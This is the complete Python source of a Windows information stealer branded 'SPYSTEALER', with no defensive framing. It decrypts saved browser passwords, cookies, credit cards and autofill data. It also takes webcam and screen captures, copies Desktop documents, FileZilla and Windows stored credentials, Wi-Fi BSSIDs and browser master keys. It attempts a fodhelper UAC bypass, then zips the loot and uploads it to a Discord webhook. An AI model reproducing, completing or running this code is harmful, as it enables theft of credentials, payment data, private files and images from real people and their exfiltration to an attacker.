import os
import re
import sqlite3
import platform
import socket
import getpass
import subprocess
import requests
import pyperclip
import psutil
import base64
import json
import shutil
import random
import string
import zipfile
import glob
import cv2
from PIL import ImageGrab
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime, timedelta

# 🕷️ Config
WEBHOOK = ''  # <- INSERT your webhook here
PREFIX = f"SPYDROP_{getpass.getuser()}"

# 📈 Browser Paths
browsers = {
    'Brave': os.getenv('LOCALAPPDATA') + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Chrome': os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data',
    'Chromium': os.getenv('LOCALAPPDATA') + '\\Chromium\\User Data',
    'Edge': os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data',
    'OperaGX': os.getenv('APPDATA') + '\\Opera Software\\Opera GX Stable',
}

# 🔧 Utility Functions

def random_suffix(length=5):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def save_file(name, content):
    try:
        with open(name, 'w', encoding='utf-8') as f:
            if isinstance(content, list):
                f.writelines(line + '\n' for line in content)
            elif isinstance(content, dict):
                for key, value in content.items():
                    f.write(f"{key}: {value}\n")
            else:
                f.write(str(content))
    except:
        pass

def create_zip(files, output_name):
    with zipfile.ZipFile(output_name, 'w') as zipf:
        for file in files:
            if os.path.exists(file): 
                zipf.write(file)
                os.remove(file)

def upload_zip_to_discord(zip_path):
    try:
        with open(zip_path, "rb") as f:
            requests.post(WEBHOOK, files={"file": f})
    except:
        pass
    try:
        os.remove(zip_path)
    except:
        pass

# 🔢 Core Data Grabs

def decrypt_password(buff: bytes, key: bytes) -> str:
    try:
        if buff.startswith(b'v10') or buff.startswith(b'v11'):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        else:
            return CryptUnprotectData(buff, None, None, None, 0)[1].decode()
    except:
        return "[Decryption failed]"

def get_master_key(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def grab_browser_data():
    logs = {}
    data_queries = {
        'Passwords': {'query': 'SELECT action_url, username_value, password_value FROM logins', 'file': '\\Login Data', 'columns': ['URL', 'Username', 'Password'], 'decrypt': True},
        'Cookies': {'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies', 'file': '\\Network\\Cookies', 'columns': ['Host', 'Name', 'Path', 'Cookie', 'Expires'], 'decrypt': True},
        'CreditCards': {'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards', 'file': '\\Web Data', 'columns': ['Name', 'Card Number', 'Expires', 'Added On'], 'decrypt': True},
    }
    for browser, path in browsers.items():
        if not os.path.exists(path):
            continue
        key = get_master_key(path)
        if not key:
            continue
        profile = "Default"
        for datatype, info in data_queries.items():
            data = get_data(path, profile, key, datatype, info)
            if data:
                logs[f"{PREFIX}_{browser}_{datatype}_{random_suffix()}.txt"] = data
    return logs

def get_data(path, profile, key, datatype, info):
    db_path = os.path.join(path, profile, info['file'].strip("\\"))
    if not os.path.exists(db_path):
        return ""
    try:
        shutil.copy2(db_path, 'temp_db')
        conn = sqlite3.connect('temp_db')
        cursor = conn.cursor()
        cursor.execute(info['query'])
        result = ""
        for row in cursor.fetchall():
            row = list(row)
            if info['decrypt']:
                row = [decrypt_password(col, key) if isinstance(col, bytes) else col for col in row]
            result += "\n".join(f"{col}: {val}" for col, val in zip(info['columns'], row)) + "\n\n"
        conn.close()
        os.remove('temp_db')
        return result
    except:
        return ""

# 🎯 Extra Stealers

def record_webcam(output_file='webcam.jpg'):
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite(output_file, frame)
        cam.release()
    except:
        pass

def capture_screen(output_file='screenshot.jpg'):
    try:
        img = ImageGrab.grab()
        img.save(output_file)
    except:
        pass

def steal_documents(target_folder='stolen_docs'):
    try:
        desktop = os.path.join(os.path.expanduser('~'), 'Desktop')
        if not os.path.exists(target_folder):
            os.makedirs(target_folder)
        for ext in ('*.doc', '*.docx', '*.pdf', '*.txt'):
            for file in glob.glob(os.path.join(desktop, ext)):
                shutil.copy(file, target_folder)
    except:
        pass

def steal_filezilla_credentials(output_file='filezilla_credentials.txt'):
    path = os.path.join(os.getenv('APPDATA'), 'FileZilla', 'recentservers.xml')
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            with open(output_file, 'w', encoding='utf-8') as o:
                o.write(f.read())
    except:
        pass

def dump_credentials(output_file='credentials.txt'):
    try:
        creds = subprocess.check_output('cmdkey /list', shell=True).decode()
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(creds)
    except:
        pass

def grab_browser_extensions(output_file="browser_extensions.txt"):
    try:
        extensions = []
        for browser, path in browsers.items():
            extensions_dir = os.path.join(path, "Default", "Extensions")
            if not os.path.exists(extensions_dir):
                continue
            for ext_id in os.listdir(extensions_dir):
                manifest_path = os.path.join(extensions_dir, ext_id, os.listdir(os.path.join(extensions_dir, ext_id))[0], "manifest.json")
                if os.path.exists(manifest_path):
                    with open(manifest_path, "r", encoding="utf-8", errors="ignore") as f:
                        data = json.load(f)
                        name = data.get("name", "Unknown")
                        version = data.get("version", "?")
                        extensions.append(f"{browser} - {name} (v{version})")
        if extensions:
            save_file(output_file, extensions)
    except:
        pass

def steal_browser_sessions(output_folder="cookies_sessions"):
    try:
        if not os.path.exists(output_folder):
            os.makedirs(output_folder)
        for browser, path in browsers.items():
            cookies_db = os.path.join(path, "Default", "Network", "Cookies")
            if os.path.exists(cookies_db):
                shutil.copy2(cookies_db, os.path.join(output_folder, f"{browser}_cookies.db"))
    except:
        pass

def grab_browser_autofill():
    logs = {}
    autofill_query = {
        'Autofill': {
            'query': 'SELECT name, value FROM autofill',
            'file': '\\Web Data',
            'columns': ['Name', 'Value'],
            'decrypt': False
        }
    }
    for browser, path in browsers.items():
        if not os.path.exists(path):
            continue
        key = get_master_key(path)
        if not key:
            continue
        profile = "Default"
        for datatype, info in autofill_query.items():
            data = get_data(path, profile, key, datatype, info)
            if data:
                logs[f"{PREFIX}_{browser}_autofill_{random_suffix()}.txt"] = data
    return logs

def wifi_bssid_geolocation(output_file="wifi_location.txt"):
    try:
        networks = []
        output = subprocess.check_output('netsh wlan show networks mode=bssid', shell=True).decode()
        matches = re.findall(r"SSID\s\d+\s:\s(.+?)\r\n.+?BSSID\s\d+\s:\s([\w:]+)", output, re.DOTALL)
        for ssid, bssid in matches:
            networks.append(f"SSID: {ssid.strip()} - BSSID: {bssid.strip()}")
        save_file(output_file, networks)
    except:
        pass

def dump_browser_master_keys(output_file="browser_master_keys.txt"):
    keys = []
    for browser, path in browsers.items():
        if not os.path.exists(path):
            continue
        master_key = get_master_key(path)
        if master_key:
            keys.append(f"{browser} MasterKey: {base64.b64encode(master_key).decode()}")
    if keys:
        save_file(output_file, keys)

def attempt_uac_bypass():
    try:
        reg_path = "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command"
        payload = f'cmd.exe /c start "" "{os.path.realpath(__file__)}"'
        subprocess.call(f'reg add {reg_path} /d "{payload}" /f', shell=True)
        subprocess.call('reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f', shell=True)
        subprocess.call("fodhelper.exe", shell=True)
    except:
        pass

# 📊 Info Gathering

def get_system_info():
    return {
        "PC Name": platform.node(),
        "Username": getpass.getuser(),
        "OS": f"{platform.system()} {platform.release()}",
        "Local IP": socket.gethostbyname(socket.gethostname())
    }

def get_external_info():
    try:
        res = requests.get("http://ip-api.com/json/", timeout=5)
        data = res.json()
        return {
            "External IP": data.get("query", "N/A"),
            "Location": f"{data.get('city')}, {data.get('regionName')}, {data.get('country')}",
            "ISP": data.get("isp", "N/A")
        }
    except:
        return {"External IP": "N/A", "Location": "N/A", "ISP": "N/A"}

def send_embed(info):
    external = get_external_info()
    embed = {
        "title": "🕷️ SPYSTEALER Drop 🕷️",
        "description": "**New Device Logged**",
        "color": 0x3498db,
        "fields": [
            {"name": "💻 Machine", "value": f"`{info['PC Name']}`", "inline": True},
            {"name": "👤 User", "value": f"`{info['Username']}`", "inline": True},
            {"name": "🖥️ OS", "value": f"`{info['OS']}`", "inline": True},
            {"name": "🌐 Local IP", "value": f"`{info['Local IP']}`", "inline": True},
            {"name": "🚀 External IP", "value": f"`{external['External IP']}`", "inline": False},
            {"name": "📍 Location", "value": f"`{external['Location']}`", "inline": False},
            {"name": "🏢 ISP", "value": f"`{external['ISP']}`", "inline": False}
        ],
        "footer": {"text": "SPYSTEALER Tactical Recon"},
        "timestamp": datetime.utcnow().isoformat()
    }
    try:
        requests.post(WEBHOOK, json={"username": "SPYSTEALER", "embeds": [embed]})
    except:
        pass

# 🚀 Main Execution

def main():
    attempt_uac_bypass()
    sysinfo = get_system_info()
    send_embed(sysinfo)

    files = []

    save_file("system_info.txt", sysinfo)
    files.append("system_info.txt")

    record_webcam('webcam.jpg')
    capture_screen('screenshot.jpg')
    files += ['webcam.jpg', 'screenshot.jpg']

    for filename, content in grab_browser_data().items():
        save_file(filename, content)
        files.append(filename)

    steal_documents()
    if os.path.exists('stolen_docs'):
        shutil.make_archive('stolen_docs', 'zip', 'stolen_docs')
        files.append('stolen_docs.zip')
        shutil.rmtree('stolen_docs')

    dump_credentials('credentials.txt')
    steal_filezilla_credentials('filezilla_credentials.txt')
    grab_browser_extensions()
    steal_browser_sessions()

    files += ['credentials.txt', 'filezilla_credentials.txt', 'browser_extensions.txt']

    if os.path.exists('cookies_sessions'):
        shutil.make_archive('cookies_sessions', 'zip', 'cookies_sessions')
        files.append('cookies_sessions.zip')
        shutil.rmtree('cookies_sessions')

    # ➕ New Features
    for filename, content in grab_browser_autofill().items():
        save_file(filename, content)
        files.append(filename)

    wifi_bssid_geolocation()
    files.append('wifi_location.txt')

    dump_browser_master_keys()
    files.append('browser_master_keys.txt')

    zipname = f"{PREFIX}_DUMP_{random_suffix()}.zip"
    create_zip(files, zipname)
    upload_zip_to_discord(zipname)

if __name__ == "__main__":
    main()
